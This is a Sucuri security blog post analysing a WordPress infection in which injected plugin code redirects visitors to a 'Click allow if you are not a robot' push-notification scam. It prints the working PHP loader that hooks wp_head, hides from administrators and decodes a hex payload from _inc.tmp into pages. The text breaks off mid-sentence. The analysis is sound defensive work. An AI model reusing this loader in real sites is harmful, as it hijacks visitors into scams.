---
title: Infected WordPress Plugins Redirect to Push Notification Scam
url: https://blog.sucuri.net/2022/12/infected-wordpress-plugins-redirect-to-push-notification-scam.html
source: Sucuri Blog
date: 2022-12-07
fetch_date: 2025-10-04T00:38:51.523115
---

# Infected WordPress Plugins Redirect to Push Notification Scam

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

[![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)

[Login](https://dashboard.sucuri.net/login/)

[Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)

Search for:

Search

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

# How to Fix & Remove the “Click Allow If You Are Not a Robot” Redirect

[![](https://secure.gravatar.com/avatar/b415a0df64f980115c24f4292e497da030d91ded0fa494a23ad4012ad211b491?s=60&d=mm&r=g)](https://blog.sucuri.net/author/eli-trevino)

[Eli Trevino](https://blog.sucuri.net/author/eli-trevino)

* December 6, 2022

![Infected Plugins Redirect to Push Notification Scam](https://blog.sucuri.net/wp-content/uploads/2022/12/BlogPost_Feature-Image_1490x700_Obfuscation1-820x386.png)

Attackers are always finding unique ways to avoid detection. Our teams regularly find malware on compromised websites which have been obfuscated to make it more difficult for webmasters to detect or understand. Obfuscation can take many forms, such as encrypting code or using complex algorithms to hide the true nature of the malicious contents. For example, many malware samples we detect are encoded into **base64** to confuse website owners and evade detection.

But during a recent investigation, I stumbled across a rather interesting piece of malware using a more complex form of [obfuscation](https://blog.sucuri.net/2022/05/x-cart-skimmer-with-dom-based-obfuscation.html). Instead of leveraging the typical **base64** encoding to evade detection, the attacker was adding variations of a PHP function to normal plugin files which decoded **hex2dec** from a second file containing a hexadecimal payload. This payload led hacked websites to display the message “**Click allow if you are not a robot**“.

Let’s take a closer look.

## Unwanted redirects to “Click allow if you are not a robot”

A new client was complaining that whenever a site visitor clicked anywhere on their website, a browser tab was opened which redirected the victim to the following spammy web page: **hxxps://1.guesswhatnews[.]com/not-a-robot/index.html**

![malicious fake captcha for click allow if you are not a robot](https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages.png)

Fake captcha displayed with message “Click allow if you are not a robot” to redirected website visitors.

The spam website was resolving to an IP address <https://urlscan.io/ip/45.133.44.20> employed by a shady ad network mainly used for porn websites.

An inspection of the compromised web page revealed a malicious JavaScript injection as the source of the redirect, which had been injected into random plugin files on the compromised website.

## Malicious JavaScript injected into WordPress plugins via \_inc.tmp

As it turns out, our remediation teams have recently noticed an influx of tickets for WordPress websites that have the following code injected into random plugins:

```
if ((is_admin() || (function_exists('get_hex_cache'))) !== true) {
        add_action('wp_head', 'get_hex_cache', 12);

        function get_hex_cache()
        {
            return print(@hex2bin( '3c7' . (file_get_contents(__DIR__  .'/_inc.tmp'))));
        }
    }
```

This PHP code injects the decoded contents of **\_inc.tmp** (found in the same plugin directory) into the header section of the site’s WordPress pages.

To accomplish this, it adds the **get\_hex\_cache** function to the **wp\_head** hook. This hook is only added once, even when more than one plugin is infected. It’s also worth noting that the malware is not activated for site administrators.

The **\_inc.tmp** file contains a **51Kb**-long sequence of digits:

![The _inc.tmp file containing 51Kb-long sequence of digits:](https://blog.sucuri.net/wp-content/uploads/2022/12/inc-tmp-file-51kb.png)

It’s a hexadecimally encoded binary string. The malware appends **3c7** at the beginning of the string and decodes using the **hex2bin** PHP function.

The decoded results contain a **<script>** tag populated with obfuscated JavaScript code, which is injected into WordPress pages.

![Example of the injected malicious JavaScript](https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-injected-script-example.png)

Example of the injected script

The code begins with “**function \_0x18b4(){const \_0x188f70=**”. And yet another interesting feature of this injection is the **data-group=”lists”** parameter of the script tag. A quick check with [PublicWWW](https://publicwww.com/websites/%22data-group%3D%5C%22lists%5C%22%3Efunction%2B_0x18b4%28%29%7Bconst%2B_0x188f70%22/) revealed over 170 websites infected with this particular piece of malware (at the time of writing).

Furthermore, the script adds a listener to the whole page’s **onclick** event. Whenever a site visitor clicks on any link, it changes the link to hxxps://**1.guesswh...